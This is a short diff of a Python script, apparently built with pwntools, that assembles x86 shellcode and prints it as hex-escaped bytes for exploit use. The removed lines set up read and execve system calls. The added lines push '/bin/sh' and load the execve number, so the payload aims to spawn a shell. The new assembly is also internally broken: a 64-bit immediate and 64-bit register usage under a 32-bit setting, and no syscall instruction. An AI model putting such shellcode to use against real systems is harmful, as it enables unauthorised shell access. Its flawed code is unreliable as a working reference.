@@ -11,22 +11,13 @@ code = ""
 # code += amd64.pushstr(r)
 # code += "jmp rsp"
 r = asm('''
-    xor eax,eax
-    xor ebx,ebx
-    push esp
-    pop ecx
-    push 7
-    pop edx
-    syscall
-        
-    push 0x3b
-    pop eax
-    xchg ecx,ebx
-    xor edx,edx
-    sysenter
-         
-
+    xor eax, eax
+    mov al, 0x3b
+    push 0x0068732f6e69622f
+    lea edi, [rsp]
+    xor esi, esi
+    xor edx, edx
 ''',arch='x86')
 
-print(''.join(['\\x' + ''.join([r.hex()[x],r.hex()[x+1]]) for x in range(0,len(r.hex()),2)]))
+print(''.join(  ['\\x' + ''.join([r.hex()[x],r.hex()[x+1]]) for x in range(0,len(r.hex()),2)]))
 print("length: " + str(len(r)))
